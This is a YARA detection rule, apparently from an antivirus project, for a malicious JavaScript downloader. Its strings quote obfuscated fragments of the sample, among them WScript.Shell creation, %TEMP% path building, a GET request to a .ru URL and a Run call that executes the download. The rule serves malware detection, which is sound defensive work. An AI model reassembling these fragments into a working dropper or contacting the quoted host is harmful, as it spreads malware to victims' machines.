rule sig_20160427_100a4588ff835f94b62620ce606f2c56 {
  meta:
    description = "datamaliciousorder - file 20160427_100a4588ff835f94b62620ce606f2c56.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a977c65b2605efbea8a8e7670242253ad6f9b8a593b2173cea952b51e102c160"

  strings:
    $s1  = "function YpvrzCorue() {return QictoFoyfj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WGgPywk" ascii
    $s2  = "function YpvrzCorue() {return QictoFoyfj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WGgPywk" ascii
    $s3  = "var QictoFoyfj = function ElrruLwkmi() {return LsmmuIayne[CutveWqmsf](\"WScript\"+\".Shell\");}(), UndhaKqtuu = 11;" fullword ascii
    $s4  = "function RmrqxFmlud(VzmtbWemjg, AsxhiHouqf){RgnciPxbfh = RgnciPxbfh * 1; return VzmtbWemjg - AsxhiHouqf;};" fullword ascii
    $s5  = "RksipHjqzm[TigwaQpwhf](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var LsmmuIayne = this[\"WScript\"];" fullword ascii
    $s7  = "function DllfcDlfxn(CtutwNjkuz){QictoFoyfj[\"R\"+\"un\"](CtutwNjkuz, RgnciPxbfh, RgnciPxbfh);};" fullword ascii
    $s8  = "if (RksipHjqzm[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function XspwxGepnb(){return RirbsTtjea + \"\";};" fullword ascii
    $s10 = "function ZzpktMvfof() {return ((ZfkspCvgdh == true) && (ZfkspCvgdh == VrzdaUelsy)) ? 1 : RgnciPxbfh;};" fullword ascii
    $s11 = "VrzdaUelsy = true; " fullword ascii
    $s12 = "function SqsbxVwbli(){return 23;};" fullword ascii
    $s13 = "ZfkspCvgdh = true; " fullword ascii
    $s14 = "var VrzdaUelsy = false;" fullword ascii
    $s15 = "var FmmieItfod = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "}while (QzedtTzicc);" fullword ascii
    $s17 = "var ZfkspCvgdh = false;" fullword ascii
    $s18 = "function DmbblBskcr()" fullword ascii
    $s19 = "function BxfttYrkpi(){return CutveWqmsf;};" fullword ascii
    $s20 = "NkpcyRfave = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}